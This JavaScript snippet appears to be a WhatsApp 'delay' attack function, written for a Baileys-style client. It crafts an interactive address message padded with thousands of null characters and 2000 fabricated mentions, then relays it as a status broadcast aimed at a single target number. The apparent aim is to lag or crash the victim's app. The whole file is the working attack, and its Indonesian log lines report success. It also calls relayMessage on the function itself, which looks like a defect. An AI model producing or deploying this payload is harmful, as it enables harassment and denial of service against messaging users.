async function DelayX(target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
        },
        body: {
          text: "\u0000".repeat(450),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: JSON.stringify({
            values: {
              in_pin_code: "999999",
              building_name: "ByOmOsaka",
              landmark_area: "X",
              address: "OneVDelay",
              tower_number: "OnevDelay",
              city: "Infinity",
              name: "ByOmOsaka",
              phone_number: "999999999999",
              house_number: "xxx",
              floor_number: "xxx",
              state: `+ | ${"\u0000".repeat(9000)}`
            }
          }),
          version: 3
        }
      }
    }, { userJid: target });

    await DelayX.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log(` DelayX Berhasil Terkirim✅ Ke ${target}`);
  } catch (error) {
    console.error("DelayX Eror Jir❌:", error);
  }
}